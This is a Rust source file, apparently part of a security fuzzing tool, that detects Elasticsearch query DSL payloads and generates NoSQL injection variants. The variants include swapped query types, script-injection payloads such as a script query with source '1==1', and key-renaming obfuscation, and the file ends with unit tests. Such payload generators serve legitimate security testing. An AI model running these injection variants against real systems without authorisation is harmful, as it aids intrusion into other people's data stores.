//! Elasticsearch NoSQL injection grammar-aware mutation.

/// Detect Elastic query DSL signals.
#[must_use]
pub fn detect_type(payload: &str) -> bool {
    let p = payload.trim();
    p.starts_with('{')
        && (p.contains("\"match\"")
            || p.contains("\"term\"")
            || p.contains("\"query\"")
            || p.contains("\"bool\"")
            || p.contains("\"must\"")
            || p.contains("\"should\"")
            || p.contains("\"filter\"")
            || p.contains("\"script\"")
            || p.contains("\"exists\"")
            || p.contains("\"range\""))
}

/// Generate Elastic query DSL mutation variants.
#[must_use]
pub fn mutate(payload: &str) -> Vec<String> {
    if !detect_type(payload) {
        return Vec::new();
    }
    let mut results = Vec::new();

    // Query type mutations
    let replacements = [
        (
            "\"match\"",
            vec!["\"match_phrase\"", "\"query_string\"", "\"match\""],
        ),
        ("\"term\"", vec!["\"terms\"", "\"exists\"", "\"term\""]),
        ("\"must\"", vec!["\"should\"", "\"filter\"", "\"must\""]),
        ("\"bool\"", vec!["\"constant_score\"", "\"bool\""]),
    ];
    for (orig, alts) in &replacements {
        if payload.contains(orig) {
            for alt in alts {
                if *alt != *orig {
                    results.push(payload.replace(orig, alt));
                }
            }
        }
    }

    // Script injection variants
    if payload.contains("query") || payload.contains("match") {
        results.push(String::from(r#"{"query": {"script": {"source": "1==1"}}}"#));
        results.push(String::from(
            r#"{"query": {"script_score": {"query": {"match_all": {}}, "script": {"source": "1"}}}}"#,
        ));
    }

    // Nested object obfuscation
    results.push(payload.replace("\"query\"", "\"q\""));

    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_elastic_signals() {
        assert!(detect_type(r#"{"query": {"match": {"title": "test"}}}"#));
        assert!(detect_type(r#"{"bool": {"must": {"term": {"x": 1}}}}"#));
    }

    #[test]
    fn generates_query_variants() {
        let mutations = mutate(r#"{"query": {"match": {"title": "test"}}}"#);
        assert!(mutations.iter().any(|m| m.contains("match_phrase")));
    }

    #[test]
    fn rejects_non_elastic() {
        assert!(!detect_type("hello world"));
        assert!(mutate("' OR 1=1--").is_empty());
    }

    #[test]
    fn generates_script_injection_variants() {
        let mutations = mutate(r#"{"query": {"match": {"title": "test"}}}"#);
        assert!(mutations.iter().any(|m| m.contains("script")));
    }

    #[test]
    fn generates_nested_obfuscation() {
        let mutations = mutate(r#"{"query": {"match": {"title": "test"}}}"#);
        assert!(
            mutations
                .iter()
                .any(|m| m.contains("\"q\"") || m.contains("query_string"))
        );
    }

    #[test]
    fn empty_payload_returns_empty() {
        assert!(mutate("").is_empty());
    }

    #[test]
    fn rejects_plain_text() {
        assert!(!detect_type("just some text"));
        assert!(mutate("just some text").is_empty());
    }
}
